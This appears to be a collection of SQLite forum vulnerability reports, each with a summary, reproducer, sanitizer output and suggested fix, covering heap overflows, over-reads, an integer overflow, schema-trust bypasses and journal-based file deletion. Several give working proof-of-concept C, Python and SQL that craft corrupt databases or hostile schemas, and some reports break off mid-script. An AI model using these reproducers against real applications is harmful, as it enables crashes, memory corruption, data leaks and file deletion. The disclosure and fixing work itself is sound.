0x502000000daf is located 1 bytes to the left of 8-byte region [0x502000000db0,0x502000000db8)
allocated by thread T0 here:
...
#4 in transliterate            ext/misc/spellfix.c:1724
#5 in spellfix1FilterForMatch  ext/misc/spellfix.c:2598
SUMMARY: AddressSanitizer: heap-buffer-overflow ext/misc/spellfix.c:2607 in spellfix1FilterForMatch
==ABORTING
EXIT=1

Fix
Add the nPattern>0 guard already present at the sibling branch (line 2779):
/* ext/misc/spellfix.c: spellfix1FilterForMatch(), line 2607 */
if( nPattern>0 && zPattern[nPattern-1]=='*' ) nPattern--;

title: SQLITE_OMIT_FLOATING_POINT causes compilation error

posts.author: anonymous
posts.body:
Hello,

Looks like SQLITE_OMIT_FLOATING_POINT causes compilation error.

In function sqlite3AtoF there is code that looks like this:

SQLITE_PRIVATE int sqlite3AtoF(const char *zIn, double *pResult){
#ifndef SQLITE_OMIT_FLOATING_POINT
const unsigned char *z = (const unsigned char*)zIn;
int neg = 0;       /* True for a negative value */
u64 s = 0;         /* mantissa */
int d = 0;         /* Value is s * pow(10,d) */
int mState = 0;    /* 1: digit seen 2: fp 4: hard-zero */
unsigned v;        /* Value of a single digit */

/* ...... */

return 0xfffffff0 | mState;
#else
return sqlite3Atoi64(z, pResult, strlen(z), SQLITE_UTF8)==0;
#endif /* SQLITE_OMIT_FLOATING_POINT */
}

With SQLITE_OMIT_FLOATING_POINT z is unknown in return sqlite3Atoi64(z, pResult, strlen(z), SQLITE_UTF8)==0;.

An obvious fix is changing order of two first lines to so they would go like this:

const unsigned char *z = (const unsigned char*)zIn;
#ifndef SQLITE_OMIT_FLOATING_POINT

Yes, I know SQLITE_OMIT_* macros are not tested: I have just tested one of them ;)

thank you,
Sławomir Piotrowski

title: PTP - Odd UTF-16 prepare length reads past caller buffer

posts.author: drh
posts.body: Should be fixed by check-in 2026-06-24T12:22:22.492Z.

posts.author: Bruno (bruno-tob)
posts.body:
Summary
sqlite3_prepare16_v2() reads a second byte while normalizing an odd positive
nByte value, even when the caller supplied only one readable byte. A caller
that passes an odd-length UTF-16 buffer can therefore trigger an out-of-bounds
read before SQLite converts the SQL text to UTF-8.

Affected Area

SQLite version or Fossil check-in: 3.54.0 / dc4763b14c421710f2a19c19c1cac455c1d0
Build options or relevant feature flags: Default amalgamation build with
SQLITE_OMIT_UTF16 unset.
Component or source path: src/prepare.c, sqlite3Prepare16(), and the
public sqlite3_prepare16_v2() API.

Steps to Reproduce
Compile the attached poc.c against the affected SQLite amalgamation and run
the resulting binary.

The PoC places one readable byte at the end of a page and calls
sqlite3_prepare16_v2(db, zSql, 1, ...). ASan reports a read past that byte in
sqlite3VdbeMemHandleBom() reached from sqlite3_prepare16_v2().

Expected Behavior
SQLite should never read beyond the supplied positive byte count. An odd
positive UTF-16 length should be truncated or rejected without touching the
missing second byte.

Actual Behavior
SQLite reads z[1] while handling nByte=1, crossing into the protected page
before returning from prepare.

Impact
Memory safety violation: a hostile public C API caller can force an
out-of-bounds read from adjacent process memory or a guard page.

Evidence
In src/prepare.c, sqlite3Prepare16() advances positive-length
input in two-byte steps while only checking sz<nBytes. For odd nBytes, it
can either inspect z[sz+1] directly or round the length up to the next code
unit, after which sqlite3Utf16to8() reads the missing second byte.

title: PTP - Heap buffer overflow in sqlite3ParseUri for over-1GiB file: URI filenames

posts.author: Bruno (bruno-tob)
posts.body:
Summary
sqlite3ParseUri() sizes its output buffer from sqlite3Strlen30(), which
masks a real filename length to 30 bits. A NUL-terminated file: URI longer
than 1 GiB can therefore allocate a tiny buffer and then overflow it while the
copy loop continues to the real terminator.

Affected Area

SQLite version or Fossil check-in: 3.54.0 / dc4763b14c421710f2a19c19c1cac455c1d0
Build options or relevant feature flags: Default amalgamation build;
SQLITE_OPEN_URI enabled for the open call.
Component or source path: src/main.c, sqlite3ParseUri(), and
sqlite3Strlen30() in src/util.c.

Steps to Reproduce
Compile the attached poc.c against the affected SQLite amalgamation and run
the resulting binary.

The PoC allocates a NUL-terminated file: URI with real length 0x40000005
and passes it to sqlite3_open_v2() with SQLITE_OPEN_URI.

Expected Behavior
SQLite should reject URI strings whose true length is not representable by the
internal length type, or size and bound the copy using the full validated
length.

Actual Behavior
sqlite3Strlen30() returns 5, sqlite3ParseUri() allocates a 24-byte buffer,
and the URI copy loop writes far beyond that buffer under ASan.

Impact
Memory safety violation: a hostile public filename input can overflow a heap
buffer before VFS pathname handling begins.

Evidence
In src/main.c, sqlite3ParseUri() computes
int nUri = sqlite3Strlen30(zUri) and allocates from that truncated value, but
its later copy loop walks until the real NUL byte or #. src/util.c
implements sqlite3Strlen30() by masking the length to 30 bits.

title: PTP - Malformed UTF-8 precision in %!s allows oversized memcpy

posts.author: Bruno (bruno-tob)
posts.body:
Summary
The %!s formatter treats precision as a UTF-8 character count, then narrows
the resulting byte distance to int before appending it. A malformed 4 GiB-scale
UTF-8 string can make that distance wrap negative and reach memcpy() through
sqlite3_str_append().

Affected Area

SQLite version or Fossil check-in: 3.54.0 / dc4763b14c421710f2a19c19c1cac455c1d0
Build options or relevant feature flags: Default amalgamation build; no
PoC-added SQLITE_ENABLE_* flags.
Component or source path: src/printf.c, sqlite3VXPrintf(), and public
SQLite printf APIs.

Steps to Reproduce
Compile the attached poc.c against the affected SQLite amalgamation and run
the resulting binary.

The PoC maps a malformed 4 GiB-scale string and calls
sqlite3_snprintf(sizeof(out), out, "%!.1s", s). ASan reports
negative-size-param in sqlite3_str_append().

Expected Behavior
SQLite should reject or safely truncate any UTF-8 precision result that does
not fit the append length type, without calling memcpy() with a negative
length.

Actual Behavior
The %!s path computes a byte length that narrows to a negative int, and
sqlite3_str_append() reaches memcpy() with an oversized size.

Impact
Memory safety violation: public formatter input can reach an oversized
memcpy() and corrupt or crash the embedding process.

Evidence
In src/printf.c, sqlite3VXPrintf() uses SQLITE_SKIP_UTF8() to
advance a pointer for %!s precision and stores (int)(z-bufpt) in length.
The code does not check that the byte distance fits int before passing it to
sqlite3_str_append().

Running the compiled PoC produced:
mapped_len=4294967196 narrowed_to_int=-100
calling sqlite3_snprintf(sizeof(out), out, "%!.1s", s)
=================================================================
==2==ERROR: AddressSanitizer: negative-size-param: (size=-100)
#0 0xe352c58435d8 in memcpy (libasan.so.8+0xd35d8)
#1 0xbaafe9e9a574 in sqlite3_str_append sqlite3.c:33711
#2 0xbaafe9e8ac94 in sqlite3_str_vappendf sqlite3.c:33557
#3 0xbaafe9ec048c in sqlite3_snprintf sqlite3.c:33989
#4 0xbaafe9febc6c in main poc.c:92
#5 0xe352c5496570 in __libc_start_call_main (libc.so.6+0x26570) (BuildId: a4245e8262492021a4841da08a928c339bd69fd1)
#6 0xe352c5496654 in __libc_start_main_impl (libc.so.6+0x26654) (BuildId: a4245e8262492021a4841da08a928c339bd69fd1)
#7 0xbaafe9e398ec in _start (poc+0x298ec)

Address 0xdf51c1c00000 is a wild pointer inside of access range of size 0x000000000001.
SUMMARY: AddressSanitizer: negative-size-param sqlite3.c:33711 in sqlite3_str_append
==2==ABORTING

Suggested Fix
Check that the %!s byte distance fits the append length type before assigning
it to length or calling sqlite3_str_append(). Add formatter regressions in
test/printf*.test or test/c/snprintf1.c for %!s character precision where
the byte distance exceeds INT_MAX.

against the PoC and source path.

title: PTP - Crafted Rollback Journal Can Delete an Arbitrary File

posts.author: Bruno (bruno-tob)
posts.body:
Summary
SQLite hot-journal recovery trusts a super-journal pathname embedded at the end
of a rollback journal before verifying that the rollback journal contains a
valid preceding journal record. An attacker who can place or modify
<database>-journal beside a database can cause a read-write opener to unlink an
attacker-chosen readable file outside the database directory.

This is reachable through normal SQLite APIs. In local testing,
sqlite3_prepare_v2() on PRAGMA integrity_check triggered recovery and
deleted the chosen file before returning ok.

Impact
Arbitrary file deletion within the privileges of the SQLite process, subject to
normal filesystem permissions and VFS behavior. The deleted file does not need
to be a real super-journal. It only needs to be readable and deletable by the
victim process, and its contents must not contain a live child-journal reference
back to the forged super-journal path.

Affected Code

src/pager.c:1303: readSuperJournal() accepts a trailing pathname if the
length, checksum, and magic bytes match.
src/pager.c:2839: pager_playback() reads the super-journal name before
processing any rollback records.
src/pager.c:2980: successful playback calls pager_delsuper().
src/pager.c:2545: pager_delsuper() opens and interprets the supplied
super-journal path.
src/pager.c:2632: if no child journal points back, pager_delsuper()
deletes the supplied path.
src/os_unix.c:6848: Unix VFS deletion reaches unlink().

Reachability
code.db call-graph evidence:
sqlite3_prepare_v2
-> sqlite3LockAndPrepare
-> sqlite3Prepare
-> schemaIsValid
-> sqlite3BtreeBeginTrans
-> btreeBeginTrans
-> lockBtree
-> sqlite3PagerSharedLock
-> pager_playback
-> readSuperJournal
-> pager_delsuper
-> sqlite3OsDelete

sqlite3_open() alone did not trigger the deletion in testing. Preparing a
schema-using statement such as SELECT * FROM t or PRAGMA integrity_check
did.

Reproducerdbdir="$(mktemp -d)"

title: PTP - Corrupt index cell pointer crosses page boundary

posts.author: Bruno (bruno-tob)
posts.body:
Summary
A corrupt index leaf cell pointer can point at the final byte of a page, and
the fast index comparison path reads record bytes without first proving the
cell extent fits in the page. An indexed lookup can therefore cross the SQLite
page boundary before returning corruption.

Affected Area

SQLite version or Fossil check-in: 3.54.0 / dc4763b14c421710f2a19c19c1cac455c1d0
Build options or relevant feature flags: Default command-line shell build
Component or source path: src/btree.c, findCellPastPtr(), and
indexCellCompare().

Steps to Reproduce
Generate the corrupt database, then invoke an ASan-built sqlite3 shell with
an indexed lookup:
python3 poc.py
ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 ./sqlite3 build/poc.db \
"PRAGMA cache_size=0; SELECT * FROM t INDEXED BY idx \
WHERE b=printf('%.*c', 300, 'A');"

The Python helper creates a normal database, then patches the index leaf page
so one record body crosses the page boundary. The SQL argument is an ordinary
indexed SELECT against that database.

Expected Behavior
SQLite should validate the cell pointer and local record extent before reading
the cell, and return SQLITE_CORRUPT for this database.

Actual Behavior
The indexed lookup reaches vdbeRecordCompareString() and ASan reports a
heap-buffer-overflow while memcmp() reads the claimed 300-byte key past the
page-cache allocation.

Impact
Memory safety violation: a hostile database file can cause out-of-bounds reads
from adjacent memory during indexed queries.

Evidence
In src/btree.c, findCellPastPtr() masks the corrupt cell offset
into the page but does not establish that bytes following the pointer remain in
bounds. indexCellCompare() then reads pCell[0], pCell[1], and record
bytes for the fast compare path before a per-cell extent check rejects the
page.

title: PTP - Side-effect sqlite_log() is treated as innocuous

posts.author: Bruno (bruno-tob)
posts.body:
Summary
sqlite_log() exists only for side effects, but its built-in registration
lacks the flags that make schema use rejectable under trusted_schema=OFF. A
hostile schema object can therefore send attacker-chosen values to the
application's SQLite log callback.

Affected Area

SQLite version or Fossil check-in: 3.54.0 / dc4763b14c421710f2a19c19c1cac455c1d0
Build options or relevant feature flags: Default command-line shell build;
the shell log callback is enabled with .log stdout.
Component or source path: src/func.c, errlogFunc(), and
sqlite3ExprFunctionUsable() in src/expr.c; src/shell.c.in provides the
default shell log callback used by the PoC.

Steps to Reproduce.bail on
.log stdout
.nullvalue NULL

CREATE TABLE secrets(s TEXT);
INSERT INTO secrets VALUES ('schema-leak-token');
CREATE VIEW v AS SELECT sqlite_log(28, s) AS leaked FROM secrets;

.dbconfig trusted_schema off
PRAGMA writable_schema = RESET;
SELECT * FROM v;

The shell installs SQLITE_CONFIG_LOG during startup and .log stdout routes
that callback output to stdout. The view represents attacker-controlled
persistent schema, and PRAGMA writable_schema = RESET forces SQLite to
reparse it after trusted_schema is disabled. Selecting from the view still
executes sqlite_log() from schema context.

Expected Behavior
With trusted_schema=OFF, SQLite should reject schema-derived use of
sqlite_log() because it has observable side effects.

Actual Behavior
The schema-derived view reaches the shell log callback with attacker-controlled
data instead of being rejected as unsafe:
trusted_schema off
(28) schema-leak-token
NULL

Impact
Information disclosure and log injection: hostile schema SQL can copy table or
trigger values into a higher-privilege application's SQLite log sink.

Evidence
In src/func.c, errlogFunc() calls sqlite3_log() and is
registered with FUNCTION(sqlite_log, ...) without SQLITE_FUNC_DIRECT or
SQLITE_FUNC_UNSAFE. In src/expr.c, sqlite3ExprFunctionUsable() is only
called for functions already carrying one of those flags. The shell's
main_init() in src/shell.c.in calls
sqlite3_config(SQLITE_CONFIG_LOG, shellLog, p), so this is reproducible
without a custom embedding harness.

Suggested Fix
Register sqlite_log() with the unsafe or direct-only semantics needed for
schema-derived calls to be rejected before side effects occur. Add
trusted_schema function tests in test/trustschema*.test or
test/func*.test that require sqlite_log() to be rejected from schema
contexts.

against the PoC and source path.

title: PTP - Negative sqlite3_str_append() length corrupts heap state

posts.author: Bruno (bruno-tob)
posts.body:
Summary
sqlite3_str_append() requires a non-negative length, but release builds only
enforce that requirement with an assertion. A caller that passes N=-1 after
a valid prefix append can bypass the growth check and reach memcpy() with a
huge converted size.

Affected Area

SQLite version or Fossil check-in: 3.54.0 / dc4763b14c421710f2a19c19c1cac455c1d0
Build options or relevant feature flags: Default amalgamation build; release
assertions disabled by NDEBUG.
Component or source path: src/printf.c and the public
sqlite3_str_append() API.

Steps to Reproduce
Compile the poc.c below against the affected SQLite amalgamation and run
the resulting binary.

The PoC appends "AAAA" to a new sqlite3_str, then calls
sqlite3_str_append(s, "B", -1).

PoC Source
poc.c:
#include "sqlite3.h"
#include <stdio.h>

int main(void){
sqlite3_str *s;

setvbuf(stdout, 0, _IONBF, 0);
s = sqlite3_str_new(0);
if( s==0 ){
puts("sqlite3_str_new failed");
return 2;
}

sqlite3_str_append(s, "AAAA", 4);
puts("before negative append");
sqlite3_str_append(s, "B", -1);
puts("after negative append");

sqlite3_free(sqlite3_str_finish(s));
return 0;
}

Expected Behavior
sqlite3_str_append() should reject negative lengths in all builds and set an
error without modifying the accumulator or calling memcpy().

Actual Behavior
ASan reports an oversized memcpy() from sqlite3_str_append() after the
negative length bypasses normal capacity handling.

Impact
Memory safety violation: hostile public C API input can corrupt heap state or
crash the embedding process.

Evidence
In src/printf.c, sqlite3_str_append() relies on assert(N>=0)
and then uses N in unsigned capacity arithmetic and memcpy(). With
assertions disabled, negative N is not validated before conversion to
size_t.

Running the compiled PoC produced:
before negative append
=================================================================
==2==ERROR: AddressSanitizer: negative-size-param: (size=-1)
#0 0xf2fd188d35d8 in memcpy (libasan.so.8+0xd35d8)
#1 0xb73b1941a274 in sqlite3_str_append sqlite3.c:33711
#2 0xb73b1956b788 in main poc.c:17
#3 0xf2fd18526570 in __libc_start_call_main (libc.so.6+0x26570) (BuildId: a4245e8262492021a4841da08a928c339bd69fd1)
#4 0xf2fd18526654 in __libc_start_main_impl (libc.so.6+0x26654) (BuildId: a4245e8262492021a4841da08a928c339bd69fd1)
#5 0xb73b193b95ec in _start (poc+0x295ec)

0xb73b19595260 is located 0 bytes inside of global variable '*.LC3' defined in 'poc.c' (0xb73b19595260) of size 2
'*.LC3' is ascii string 'B'
SUMMARY: AddressSanitizer: negative-size-param sqlite3.c:33711 in sqlite3_str_append
==2==ABORTING

Suggested Fix
Reject negative N values in sqlite3_str_append() before capacity arithmetic
or memcpy() in release builds. Add C API tests in test/printf*.test or
test/c/snprintf1.c that pass negative append lengths in a release-style build
and require a safe error.

title: Vuln81-62: Heap Buffer Overflow in FTS3/FTS4 fts3EvalDeferredPhrase

posts.author: ylwang (yuelinwang)
posts.body:
Summary
fts3EvalDeferredPhrase() (ext/fts3/fts3.c:4447) allocates the merge output buffer as nPoslist + 8, but the deferred token phrase merge rewrites each column's first position into a shifted varint that can take one extra byte per column, so once the column count exceeds 8 the final varint write lands past the heap buffer (CWE-787).

Reproduce#!/usr/bin/env python3
import os, subprocess, sys

SQLITE3 = "/data/ylwang/LargeScan/targets/sqlite/sqlite3"
DB = "vuln80.db"
NCOL, NFREQ, NFILLER = 20, 20000, 125   # NCOL must exceed the 8 byte padding

if os.path.exists(DB):
os.remove(DB)

cols = ",".join("c%d" % i for i in range(NCOL))
sql = [
"PRAGMA page_size=512;",
"CREATE VIRTUAL TABLE ft USING fts4(%s);" % cols,
"BEGIN;",
]
sql += ["INSERT INTO ft(c0) VALUES('common');"] * NFREQ   # makes 'common' deferred
filler = " ".join("x%d" % j for j in range(NFILLER))
colval = "%s common rare" % filler                         # phrase position lands on boundary
row = ",".join("'%s'" % colval for _ in range(NCOL))
sql.append("INSERT INTO ft VALUES(%s);" % row)
sql.append("COMMIT;")

res = subprocess.run([SQLITE3, DB], input="\n".join(sql).encode(),
stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
if res.returncode != 0:
sys.exit(res.stdout.decode("utf-8", "replace"))
print("built %s (%d bytes)" % (DB, os.path.getsize(DB)))

The SQL that triggers it:
SELECT count(*) FROM ft WHERE ft MATCH '"common rare"';

How to run it (build the db, then open it with the ASAN sqlite3 and execute the query):
python3 gen.py
/data/ylwang/LargeScan/targets/sqlite/sqlite3 vuln80.db \
"SELECT count(*) FROM ft WHERE ft MATCH '\"common rare\"';"

ASAN reports heap-buffer-overflow WRITE of size 1 ... 0 bytes to the right of 80-byte region in sqlite3Fts3PutVarint, with the allocation coming from sqlite3Fts3MallocZero inside fts3EvalDeferredPhrase.

Fix/* ext/fts3/fts3.c, fts3EvalDeferredPhrase(): reserve one extra varint byte per column */
Fts3Table *pTab = (Fts3Table *)pCsr->base.pVtab;
aOut = (char *)sqlite3Fts3MallocZero(
((i64)nPoslist) + pTab->nColumn + FTS3_BUFFER_PADDING
);

title: Vuln82-63: FTS5 Integrity-Check Heap Over-read via Unvalidated Leaf Term Length

posts.author: ylwang (yuelinwang)
posts.body:
Summary
fts5IndexIntegrityCheckSegment() (ext/fts5/fts5_index.c:8543) decodes the leaf first-term length nTerm from attacker-controlled leaf bytes without validating it against the leaf size, then fts5Memcmp(&pLeaf->p[iOff], zIdxTerm, MIN(nTerm, nIdxTerm)) reads up to that many bytes past the small fts5DataRead allocation (CWE-125).

Reproduce
Prepare the db file with the following self contained script. It uses only the python stdlib sqlite3 module to build a normal FTS5 table, then rewrites the shadow tables with plain UPDATE statements so the leaf first-term length varint and the matching %_idx.term blob are both inflated to about 4000 bytes, while the leaf body stays small. No internal SQLite C function is linked.
#!/usr/bin/env python3
import sqlite3, os, random, string

DB = "vuln82.db"
if os.path.exists(DB):
os.remove(DB)

con = sqlite3.connect(DB)
con.execute("CREATE VIRTUAL TABLE ft USING fts5(x)")
con.execute("INSERT INTO ft(ft,rank) VALUES('pgsz',64)")   # tiny pages, many %_idx split keys
random.seed(1)
w = lambda: ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
for i in range(400):
con.execute("INSERT INTO ft(x) VALUES (?)", (" ".join(w() for _ in range(6)),))
con.commit()
con.execute("INSERT INTO ft(ft) VALUES('optimize')")        # merge into one segment
con.commit()

segid, term, pgno = con.execute(
"SELECT segid, term, pgno FROM ft_idx ORDER BY length(term) DESC LIMIT 1").fetchone()
rowid = (segid << 37) | (0 << 31) | (pgno >> 1)             # FTS5_SEGMENT_ROWID(segid,0,leaf)
b = bytearray(con.execute("SELECT block FROM ft_data WHERE id=?", (rowid,)).fetchone()[0])
szLeaf = (b[2] << 8) | b[3]

def getvarint32(buf, off):
v = sh = 0; i = off
while True:
c = buf[i]; i += 1
if c < 0x80: return (v | (c << sh)), i
v |= (c & 0x7f) << sh; sh += 7
if sh >= 32: return v, i

iOff, _ = getvarint32(b, szLeaf)                            # offset of leaf first term
enc = bytearray(); v = 4000                                 # inflate nTerm to 4000
while True:
c = v & 0x7f; v >>= 7
enc.append(c | 0x80) if v else enc.append(c)
if not v: break
b[iOff:iOff+len(enc)] = enc
con.execute("UPDATE ft_data SET block=? WHERE id=?", (bytes(b), rowid))

bigterm = bytes([term[0]]) + term[1:] + b'\x00' * 4000      # inflate nIdxTerm to ~4006
con.execute("UPDATE ft_idx SET term=? WHERE segid=? AND pgno=?", (bigterm, segid, pgno))
con.commit(); con.close()
print("wrote", DB)

The SQL that triggers it:
PRAGMA integrity_check;

How to run it (build the db, then open it with the ASAN sqlite3 and run the integrity check):
python3 gen.py
/data/ylwang/LargeScan/targets/sqlite/sqlite3 vuln82.db "PRAGMA integrity_check;"

ASAN reports heap-buffer-overflow READ of size 4006 ... 0 bytes to the right of a 104-byte region in fts5IndexIntegrityCheckSegment (fts5Memcmp), with the region allocated by fts5DataRead.

Fix/* ext/fts5/fts5_index.c, fts5IndexIntegrityCheckSegment():
** reject a first-term length that runs past the leaf before comparing. */
iOff += fts5GetVarint32(&pLeaf->p[iOff], nTerm);
if( iOff + nTerm > pLeaf->szLeaf ){
FTS5_CORRUPT_ROWID(p, iRow);
}else{
res = fts5Memcmp(&pLeaf->p[iOff], zIdxTerm, MIN(nTerm, nIdxTerm));
if( res==0 ) res = nTerm - nIdxTerm;
if( res<0 ) FTS5_CORRUPT_ROWID(p, iRow);
}

posts.author: ylwang (yuelinwang)
posts.body: Maybe a little bug in idxNewConstraint() (ext/expert/sqlite3expert.c:302), where the allocation size is written as sizeof(IdxConstraint) * nColl + 1 instead of sizeof(IdxConstraint) + nColl + 1, so a 0 or 1 char collation name would heap-overflow. But it does not look externally triggerable through the shell, since the query is first prepared against the user db which rejects any collation shorter than the built-ins (all length >= 4), so the nColl in {0,1} case never reaches the bug.

title: Vuln83-64: Heap Over-read in intck intckGetToken Bracket-quoted Token Scan

posts.author: ylwang (yuelinwang)
posts.body:
Summary
intckGetToken() (ext/intck/sqlite3intck.c:331) scans a [...] quoted identifier with while( z[iRet++]!=']' && z[iRet] ), so when [ is the last byte of the string the post-increment walks past the NUL terminator and keeps reading adjacent heap memory until it happens to hit a ] or a 0 byte (CWE-125).

Reproduce
No malicious db file is needed, any database works including an in memory one. The 2 argument SQL function parse_create_index is registered by sqlite3_intck_open, and the shell .intck command leaves it registered afterwards because close only deregisters the 1 argument form, so it can be called directly with an input whose last byte is [.

The SQL that triggers it:
.intck
SELECT parse_create_index('CREATE INDEX x ON y(aaaaaaaa[', 0);

How to run it (pipe the SQL into the ASAN sqlite3 on a throwaway db):
/data/ylwang/LargeScan/targets/sqlite/sqlite3 :memory: <<'SQL'
.intck
SELECT parse_create_index('CREATE INDEX x ON y(aaaaaaaa[', 0);
SQL

ASAN reports heap-buffer-overflow READ of size 1 in intckGetToken, reading past the end of the 96 byte allocation that holds the function argument text.

title: Vuln86-67: diskused Side-effecting Function Mis-tagged SQLITE_INNOCUOUS

posts.author: ylwang (yuelinwang)
posts.body:
Summary
diskused() (ext/misc/diskused.c:843) is registered SQLITE_INNOCUOUS even though it has side effects (it runs nested CREATE TABLE temp.x plus a full dbstat() scan and DROP TABLE through sqlite3_exec), so it should be SQLITE_DIRECTONLY, and the wrong tag lets a hostile schema invoke it under the documented trusted_schema=OFF hardening, bypassing that security boundary (CWE-749).

Reproduce
Prepare the db file by building a hostile schema that embeds the function inside a view, exactly what an attacker-controlled .db would carry. This is the same construct the maintainers just fixed for sqlite_log() (commit c07e6ad039), so it is verified by differential comparison rather than an ASAN crash.
SQLITE=/data/ylwang/LargeScan/targets/sqlite/sqlite3
"$SQLITE" hostile.db <<'EOF'
CREATE TABLE t(a,b);
CREATE VIEW v_directonly AS SELECT load_extension('x') AS r;   -- DIRECTONLY control
CREATE VIEW v_diskused   AS SELECT diskused('main')    AS r;   -- mis-tagged INNOCUOUS
EOF

The SQL that triggers it (victim opens the hostile db with the recommended hardening, then queries the views):
PRAGMA trusted_schema=OFF;
SELECT length(r) FROM v_directonly;   -- correctly blocked: "unsafe use of load_extension()"
SELECT length(r) FROM v_diskused;     -- WRONGLY allowed: runs nested DDL + dbstat scan

How to run it:
/data/ylwang/LargeScan/targets/sqlite/sqlite3 hostile.db <<'SQL'
PRAGMA trusted_schema=OFF;
SELECT length(r) FROM v_directonly;
SELECT length(r) FROM v_diskused;
SQL

Under trusted_schema=OFF the load_extension view is blocked while the diskused view runs to completion and returns a multi kilobyte report, proving the side-effecting function reached execution from an untrusted schema.

Fix/* ext/misc/diskused.c sqlite3_diskused_init(): mark the side-effecting function direct-only. */
rc = sqlite3_create_function(db, "diskused", 1,
SQLITE_UTF8|SQLITE_DIRECTONLY,
0, diskusedFunc, 0, 0);

title: Vuln88-69: Signed Integer Overflow in zipfile() Aggregate Size Computation

posts.author: ylwang (yuelinwang)
posts.body:
Summary
zipfileFinal() (ext/misc/zipfile.c:2223) computes nZip = p->body.n + p->cds.n + ZIPFILE_EOCD_FIXED_SZ entirely in 32-bit int arithmetic before widening to the i64 nZip, so when the body and central-directory sizes each stay under INT_MAX but their sum exceeds it the addition overflows, mis-sizing the allocation that the following memcpy calls fill (CWE-190 leading to CWE-787).

Reproduce
No db file is needed, the zipfile extension is present in the CLI build and the input is built by the SQL itself. A recursive CTE drives the zipfile() aggregate over about 3.62 million tiny entries, so body.n reaches 1046180000 and cds.n reaches 1104100000 (each below INT_MAX), while their sum plus 22 is 2150280022 which overflows int. This needs several GiB of working memory.

The SQL that triggers it:
WITH RECURSIVE r(x) AS (
SELECT 1
UNION ALL
SELECT x+1 FROM r WHERE x < 3620000
)
SELECT length(zipfile(printf('%.*c', 250, 'a'), 0, 0, zeroblob(0), 0))
FROM r;

How to run it (a sqlite3 built with -fsanitize=signed-integer-overflow -fno-sanitize-recover=all turns the overflow into a hard error):
UBSAN_OPTIONS=halt_on_error=1 \
/data/ylwang/LargeScan/targets/sqlite/sqlite3 :memory: < poc.sql

UBSan reports signed integer overflow: 1046180000 + 1104100000 cannot be represented in type 'int' at zipfile.c:2223, on the real sqlite3_step -> sqlite3VdbeMemFinalize -> zipfileFinal path. In the default build the wrapped size is then rejected by the SQLITE_MAX_ALLOCATION_SIZE cap so the downstream heap write does not land, but the integer overflow itself is undefined behavior on the genuine execution path.

Fix/* ext/misc/zipfile.c zipfileFinal(): widen each operand before adding so the
** sum is computed in 64-bit and an oversized archive fails cleanly as NOMEM. */
nZip = (i64)p->body.n + (i64)p->cds.n + ZIPFILE_EOCD_FIXED_SZ;

title: SQLite RTree Off-by-One OOB Heap Write in anQueue

posts.author: drh
posts.body:
Received by private email from Mohammad Hossein Abedini:

Hi,

I found an off-by-one heap write in SQLite's R-tree extension. The
anQueue array in rtree.c is allocated with space for n elements but is
indexed from 1 to n inclusive during a restructuring operation, so the
write at index n goes one slot past the end of the allocation. This is
reachable with a specially shaped R-tree.

Details and a minimal reproducer below.

Vulnerability Details
Root Cause
File: ext/rtree/rtree.c

Struct declaration (line 309):
u32 anQueue[RTREE_MAX_DEPTH+1];   /* 41 elements, valid indices 0..40 */

Trigger in rtreeFilter() (line 1998):
pNew = rtreeSearchPointNew(pCsr, RTREE_ZERO, (u8)(pRtree->iDepth+1));

When pRtree->iDepth == 40, the level passed is (u8)(40+1) = 41.

OOB write in rtreeSearchPointNew() (line 1543):
static RtreeSearchPoint *rtreeSearchPointNew(
RtreeCursor *pCur,
RtreeDValue rScore,
u8 iLevel             /* iLevel = 41 here */
){
RtreeSearchPoint *pNew, *pFirst;
pFirst = rtreeSearchPointFirst(pCur);
pCur->anQueue[iLevel]++;    /* ← anQueue[41]: ONE PAST END OF ARRAY */
...

Depth validation (line 791–793) accepts iDepth == 40:
pRtree->iDepth = readInt16(pNode->zData);
if( pRtree->iDepth>RTREE_MAX_DEPTH ){    /* strictly greater — 40 passes */
rc = SQLITE_CORRUPT_VTAB;

The assert in the WRONG function: Line 1519 inside rtreeEnqueue():
assert( iLevel<=RTREE_MAX_DEPTH );

This assert is never reached for the initial search point because
rtreeSearchPointNew() takes the fast path (returning &pCur->sPoint
when pFirst==0) and returns before calling rtreeEnqueue(). The OOB
write at line 1543 fires unconditionally before any branch.

Matching decrement
rtreeSearchPointPop() (line 1613) performs:
p->anQueue[p->sPoint.iLevel]--;

When sPoint.iLevel == 41, this decrements the same OOB location. The
net effect on the adjacent heap word is +1 then -1, but the window
between these two writes spans the entire tree traversal. If an error
causes early return (SQLITE_NOMEM from node loading, etc.), the
decrement may never execute, leaving the adjacent heap permanently at +1.

Impact

anQueue is the final field of RtreeCursor (heap-allocated). The
4-byte word at anQueue[41] is inside the next heap chunk or in
allocator metadata.
With glibc ptmalloc: the +1 on the chunk size field (if aligned) or
backward pointer can corrupt heap integrity.
Guaranteed crash: any allocator that validates chunk metadata on free
will abort when the corrupted cursor is freed.
Error-path asymmetry: if node loading fails mid-traversal, anQueue[41]
stays at 1 — heap corruption persists until the cursor is freed.

Proof of Concept#!/usr/bin/env python3
"""
SQLite RTree anQueue off-by-one OOB write PoC
Crafts a minimal .db with an rtree table whose root node has iDepth=40.
Trigger: open the db with any SQLite build, run the SELECT.
"""
import struct, os

# SQLite3 page format constants
PAGE_SIZE = 4096
DB_HEADER = b'SQLite format 3\x00'

def make_rtree_db(path):
"""
Craft a minimal SQLite database containing:
- sqlite_schema with an r3tree table definition
- %r3tree_node table with root node (rowid=1) having iDepth=40

Simplest trigger: use sqlite3 CLI or Python sqlite3 module:
import sqlite3
db = sqlite3.connect(path)
db.enable_load_extension(True)
# No extension needed if rtree is built-in (default)
list(db.execute('SELECT * FROM r3tree WHERE minx <= 0'))
"""
# The simplest way: use sqlite3 module to create, then patch root node
import sqlite3
if os.path.exists(path):
os.unlink(path)

db = sqlite3.connect(path)
# Create an rtree table (2D: minx,maxx,miny,maxy)
db.execute('CREATE VIRTUAL TABLE r3tree USING rtree(id, minx,
maxx, miny, maxy)')
# Insert enough rows to create a non-trivial tree
db.executemany('INSERT INTO r3tree VALUES(?,?,?,?,?)',
[(i, i, i+1, i, i+1) for i in range(100)])
db.commit()
db.close()

# Patch the root node: set iDepth = 40 (0x0028)
# Root node is rowid=1 in %r3tree_node table
# In a freshly created rtree with 100 entries, depth is 1 or 2.
# We open and patch the raw bytes.
with open(path, 'r+b') as f:
data = bytearray(f.read())

# Find "%r3tree_node" page and root node data
# The root node starts with a 2-byte depth field.
# Search for the pattern: depth bytes (00 01 or 00 02) followed by
